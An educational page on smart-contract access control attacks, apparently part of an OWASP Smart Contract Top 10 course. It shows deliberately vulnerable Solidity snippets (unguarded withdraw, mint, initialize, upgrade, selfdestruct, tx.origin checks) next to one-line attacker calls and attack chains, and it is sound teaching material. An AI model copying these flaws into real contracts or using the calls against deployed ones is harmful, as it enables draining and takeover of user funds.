# SC01: Access Control Vulnerabilities - Attack Vectors

## Table of Contents
- [Understanding Access Control Attack Vectors](#understanding-access-control-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Access Control Failures](#chaining-access-control-failures)

## Understanding Access Control Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in contracts you own or are authorised to test.

Broken access control is rarely exploited through a clever payload. It is exploited through **direct invocation**: an attacker reads the contract, notices a privileged function with no guard (or a guard that can be bypassed), and simply calls it. Because the flaw is in *missing* or *incorrect* authorization rather than in a complicated bug, it is cheap to find at scale—automated searchers scan deployed bytecode and the mempool continuously.

The attacker's goal in this category is usually one of:

- Call a privileged function directly to move funds or mint tokens.
- Seize a role or ownership that should never have been reachable (open initializer, weak transfer).
- Substitute the contract's logic through an unguarded upgrade or `delegatecall`.
- Bypass a check that *looks* like authorization but isn't (`tx.origin`, inverted modifier).

### Core Attack Flow

```
1. Discover
   |
   Read verified source / decompile bytecode, list every external function
2. Identify
   |
   Find privileged functions with no modifier, tx.origin checks, open initializers
3. Exploit
   |
   Call withdraw/mint/selfdestruct, seize ownership, or swap implementation
4. Escalate / Exfiltrate
   |
   Drain balance, inflate supply, brick the contract, or pivot via upgrade
```

## Common Attack Patterns

### 1. Calling an Unprotected `withdraw` / Fund-Movement Function

The most direct attack: a balance-moving function has no authorization check, so the attacker calls it and keeps the proceeds.

```solidity
// Target (VULNERABLE): no modifier
function withdraw(uint256 amount) public {
    payable(msg.sender).transfer(amount);
}

// Attacker: one transaction empties the contract
target.withdraw(address(target).balance);
```

**Payoff**: the entire contract balance, transferred to the attacker, in a single confirmed transaction—irreversible.

### 2. Calling an Unprotected `mint`

A token's `mint` function is missing its `MINTER_ROLE`/owner check, so anyone can inflate supply.

```solidity
// Target (VULNERABLE)
function mint(address to, uint256 amount) external {
    _mint(to, amount);          // no role check
}

// Attacker mints an arbitrary amount to themselves, then dumps it
token.mint(attacker, 1_000_000_000e18);
```

**Payoff**: unlimited tokens the attacker sells into liquidity pools, draining paired assets and collapsing the price for every other holder.

### 3. Seizing Ownership via an Open Initializer

An upgradeable contract's `initialize` is unguarded (or the implementation is left uninitialized), so the attacker calls it and becomes owner.

```solidity
// Target (VULNERABLE): no `initializer` modifier
function initialize(address _owner) external {
    owner = _owner;
}

// Attacker becomes owner, then exercises every admin power
proxy.initialize(attacker);
proxy.upgradeTo(maliciousImplementation);   // now attacker controls the logic
```

**Payoff**: full admin authority—upgrade, pause, re-point fee recipients, and drain reserves. This is the uninitialized-proxy takeover class.

### 4. Bypassing a `tx.origin` Authorization Check (Phishing)

The victim contract authorizes with `tx.origin`. The attacker publishes an innocent-looking contract and lures the owner into calling it; that contract then calls the victim while `tx.origin` is still the owner.

```solidity
// Victim (VULNERABLE)
function withdrawAll(address to) external {
    require(tx.origin == owner, "not owner");   // wrong: uses tx.origin
    payable(to).transfer(address(this).balance);
}

// Attacker's phishing contract
contract Phish {
    Victim victim;
    function claimReward() external {           // owner is tricked into calling this
        // tx.origin is still the owner, so the check passes
        victim.withdrawAll(attacker);
    }
}
```

**Payoff**: the attacker's contract acts with the owner's authority. The fix is to check `msg.sender` (which would be the phishing contract, not the owner).

### 5. Destroying the Contract via an Unprotected `selfdestruct`

A lifecycle function that calls `selfdestruct` lacks authorization, so anyone can erase the contract and sweep its balance.

```solidity
// Target (VULNERABLE)
function kill() public {
    selfdestruct(payable(msg.sender));   // no owner check
}

// Attacker destroys the contract and takes the balance
target.kill();
```

**Payoff**: the contract's code is removed and its ether forwarded to the attacker. If other contracts depend on it (e.g., via `delegatecall` to a library), they can be bricked—the Parity multisig freeze class.

### 6. Hijacking an Unguarded Upgrade / `delegatecall`

An upgrade setter or a raw `delegatecall` target is attacker-controllable, letting the attacker run arbitrary code in the contract's own storage context.

```solidity
// Target (VULNERABLE)
function setImplementation(address impl) external {   // no admin check
    implementation = impl;
}
fallback() external payable {
    (bool ok,) = implementation.delegatecall(msg.data);
    require(ok);
}

// Attacker points the proxy at malicious logic that reassigns owner / drains funds
target.setImplementation(attackerLogic);
```

**Payoff**: because `delegatecall` executes attacker code against the proxy's storage and balance, this is equivalent to full compromise.

### 7. Exploiting an Inverted or Broken Modifier

The authorization gate exists but its logic is wrong—an inverted comparison, the wrong variable, or a modifier that never runs `_;`.

```solidity
// Target (VULNERABLE): `!=` should be `==`
modifier onlyOwner() {
    require(msg.sender != owner, "denied");
    _;
}
function setFee(uint256 f) external onlyOwner { fee = f; }

// Anyone EXCEPT the owner passes the check — the attacker sets the fee freely
target.setFee(0);
```

**Payoff**: the flawed check either locks out legitimate admins or—as here—lets unauthorized callers through. Both are exploitable.

### 8. Claiming Ownership Through a Weak Transfer

An ownership setter is public, or accepts any caller, so the attacker assigns ownership to themselves.

```solidity
// Target (VULNERABLE): missing modifier on the setter
function setOwner(address newOwner) public {
    owner = newOwner;          // anyone can become owner
}

target.setOwner(attacker);     // attacker is now owner of the protocol
```

**Payoff**: complete administrative takeover—every `onlyOwner` function is now the attacker's to call.

### 9. Front-Running a Legitimate Initialization

Even a correctly written `initialize` is exposed between deployment and the owner's initialization call. An attacker watching the mempool submits their own `initialize` with higher gas.

```solidity
// Deploy tx confirms; owner queues initialize(owner) ...
// Attacker front-runs it:
newContract.initialize(attacker);   // attacker wins the race, becomes owner
```

**Payoff**: ownership captured in the deployment window. The remedy is to initialize atomically (in the same transaction/factory) and lock the initializer.

### 10. Exploiting Default / Implicit Visibility

Legacy or ported code omits an explicit visibility keyword, leaving a helper externally callable.

```solidity
// Pre-0.5.0 style: no visibility keyword defaulted to PUBLIC
function assignOwner(address a) { owner = a; }   // callable by anyone

target.assignOwner(attacker);
```

**Payoff**: a function the author believed was internal becomes a public backdoor. Modern Solidity forces explicit visibility, but the pattern persists in migrated code.

### 11. Abusing a Missing Role Check in a Multi-Role System

A role-based contract guards most functions but forgets `onlyRole(...)` on one setter.

```solidity
// Most setters are onlyRole(ADMIN_ROLE); this one is not:
function setOracle(address o) external {   // forgotten guard
    priceOracle = o;
}

// Attacker points the oracle at a contract they control
target.setOracle(fakeOracle);
```

**Payoff**: control of a critical dependency (price oracle, fee recipient, pause flag) even though the rest of the surface is properly gated.

### 12. Escalating Through an Over-Privileged Single Key

One account holds every role, so compromising or misusing it grants total control—there is no separation of duties to contain the blast radius.

```solidity
// A single EOA is minter AND upgrader AND treasury:
grantRole(MINTER_ROLE, ownerEOA);
grantRole(UPGRADER_ROLE, ownerEOA);
grantRole(TREASURER_ROLE, ownerEOA);
// Compromise of ownerEOA => mint + upgrade + drain, all at once.
```

**Payoff**: a single stolen or leaked key becomes complete protocol compromise. Least privilege and role separation shrink what any one key can do.

## Chaining Access Control Failures

Individually severe issues combine into total, unrecoverable compromise:

```
Open initializer          -> attacker becomes owner
        +
Unguarded upgradeTo()     -> attacker installs malicious logic
        +
delegatecall to that logic -> arbitrary code runs on protocol storage
        =  full takeover: mint, drain, and self-destruct at will
```

Another common chain—the Parity multisig freeze class:

```
Unprotected library initializer -> attacker takes ownership of the shared library
        -> attacker calls selfdestruct on the library
        -> every wallet that delegatecalls the library is bricked
        =  large-scale, permanent freeze of funds, no application-level exploit needed
```

## Key Takeaways

1. **Broken access control is exploited by direct calls, not payloads**—the missing check *is* the exploit.
2. **Unprotected privileged functions are found automatically**—searchers scan bytecode and the mempool constantly.
3. **`tx.origin` checks are bypassable by phishing**—a contract the owner calls inherits the owner's `tx.origin`.
4. **Initializers and upgrades are crown jewels**—an open initializer or unguarded upgrade equals full takeover.
5. **Failures chain**—ownership capture plus an upgrade path plus `delegatecall` equals unrecoverable compromise.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build layered, verifiable authorization
- **[Code Examples](examples.md)**: See secure Solidity patterns side by side
- **[Smart Contract Learning Path](/learn/smart-contract)**: Continue the OWASP Smart Contract Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on challenges
